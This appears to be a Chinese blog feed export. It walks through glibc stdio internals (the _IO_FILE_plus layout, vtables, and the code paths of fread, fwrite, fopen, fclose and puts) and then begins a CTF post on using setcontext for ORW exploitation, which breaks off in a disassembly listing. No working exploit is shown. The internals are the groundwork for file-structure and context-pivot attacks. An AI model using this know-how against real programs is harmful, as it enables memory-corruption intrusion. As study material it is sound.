alt="image-20241207144449627"></p><p>总结：_IO_2_1_stdin_<code>、</code>_IO_2_1_stdout_<code>、</code>_IO_2_1_stderr_都为__IO_FILE_plus结构体，_IO_FILE_plus包含_IO_FILE和_IO_jump_t</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412071507135.png" alt="image-20241207150725087"></p><h2 id="IO函数介绍"><a href="#IO函数介绍" class="headerlink" title="IO函数介绍"></a>IO函数介绍</h2><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">( <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *stream)</span> ;<br></code></pre></td></tr></table></figure><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 &#x2F; libio&#x2F;iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fread (buf, size, count, fp)<br>     <span class="hljs-type">void</span> *buf;<br>     _IO_size_t size;<br>     _IO_size_t count;<br>     _IO_FILE *fp;<br>&#123;<br>  ...<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-type">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure><h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">fwrite</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE* stream)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 &#x2F; libio&#x2F;iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_fwrite (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t request = size * count;<br>  _IO_size_t written = <span class="hljs-number">0</span>;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, request);<br>  _IO_release_lock (fp);<br>  <span class="hljs-comment">/* We have written all of the input in case the return value indicates</span><br><span class="hljs-comment">     this or EOF is returned.  The latter is a special case where we</span><br><span class="hljs-comment">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="hljs-comment">     buffer and therefore written as far as fwrite is concerned.  */</span><br>  <span class="hljs-keyword">if</span> (written == request || written == EOF)<br>    <span class="hljs-keyword">return</span> count;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> written / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Next flush the (full) buffer. */</span><br>     <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br></code></pre></td></tr></table></figure><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><p>函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, *type)</span>;<br></code></pre></td></tr></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>fopen 在标准 IO 库中用于打开文件，源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FILE *<br>__fopen_maybe_mmap (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br><br><br>_IO_FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>  _IO_file_init (&amp;new_f-&gt;fp);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span><br>  new_f-&gt;fp.vtable = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>_IO_FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>strong_alias (_IO_new_fopen, __new_fopen)<br>versioned_symbol (libc, _IO_new_fopen, _IO_fopen, GLIBC_2_1);<br>versioned_symbol (libc, __new_fopen, fopen, GLIBC_2_1);<br><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> !defined O_LARGEFILE || O_LARGEFILE == 0</span><br>weak_alias (_IO_new_fopen, _IO_fopen64)<br>weak_alias (_IO_new_fopen, fopen64)<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br></code></pre></td></tr></table></figure><p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>_IO_file_init (&amp;new_f-&gt;fp);<br></code></pre></td></tr></table></figure><p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_link_in (fp)<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> *<span class="hljs-title">fp</span>;</span><br>&#123;<br>    <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br></code></pre></td></tr></table></figure><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">(FILE *stream)</span><br></code></pre></td></tr></table></figure><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_new_fclose (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> status;<br><br>  CHECK_FILE(fp, EOF);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br>  <span class="hljs-comment">/* We desperately try to help programs which are using streams in a</span><br><span class="hljs-comment">     strange way and mix old and new functions.  Detect old streams</span><br><span class="hljs-comment">     here.  */</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> _IO_old_fclose (fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-comment">/* First unlink the stream.  */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br>  <span class="hljs-keyword">else</span><br>    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="hljs-number">-1</span> : <span class="hljs-number">0</span>;<br>  _IO_release_lock (fp);<br>  _IO_FINISH (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _LIBC</span><br>      <span class="hljs-comment">/* This stream has a wide orientation.  This means we have to free</span><br><span class="hljs-comment"> the conversion functions.  */</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span> =</span> fp-&gt;_codecvt;<br><br>      __libc_lock_lock (__gconv_lock);<br>      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);<br>      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);<br>      __libc_lock_unlock (__gconv_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>_IO_free_backup_area (fp);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)<br>    &#123;<br>      fp-&gt;_IO_file_flags = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">free</span>(fp);<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> status;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);<br>strong_alias (_IO_new_fclose, __new_fclose)<br>versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br></code></pre></td></tr></table></figure><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br></code></pre></td></tr></table></figure><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FINISH (fp);<br></code></pre></td></tr></table></figure><h3 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf&#x2F;puts"></a>printf&#x2F;puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">vfprintf+<span class="hljs-number">11</span><br><span class="hljs-variable">_IO_file_xsputn</span><br><span class="hljs-variable">_IO_file_overflow</span><br>funlockfile<br><span class="hljs-variable">_IO_file_write</span><br>write<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于利用setcontext打ORW</title>
    <link href="/2024/11/21/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8setcontext%E6%89%93ORW/"/>
    <url>/2024/11/21/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8setcontext%E6%89%93ORW/</url>
    
    <content type="html"><![CDATA[<h1 id="关于利用setcontext打ORW"><a href="#关于利用setcontext打ORW" class="headerlink" title="关于利用setcontext打ORW"></a>关于利用setcontext打ORW</h1><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>那是一个昏暗的晚上，时间已经9：30。我手贱的开了一个题，没想到这题让我彻夜难眠。</p><h2 id="setcontext简绍"><a href="#setcontext简绍" class="headerlink" title="setcontext简绍"></a>setcontext简绍</h2><p>源码分析(2.27版本及其以前)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; =============== S U B R O U T I N E =======================================</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; __int64 __fastcall setcontext(__int64)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                 <span class="hljs-meta">public</span> setcontext <span class="hljs-comment">; weak</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> setcontext      proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: sub_587B0+C↓p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                                         <span class="hljs-comment">; DATA XREF: LOAD:0000000000009018↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052180</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052181</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">128h</span>] <span class="hljs-comment">; nset</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052188</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>        <span class="hljs-comment">; oset</span><br><span class="hljs-symbol">.text:</span>000000000005218A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; how</span><br><span class="hljs-symbol">.text:</span>000000000005218F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-number">8</span>         <span class="hljs-comment">; sigsetsize</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052195</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>000000000005219A                 <span class="hljs-keyword">syscall</span>                 <span 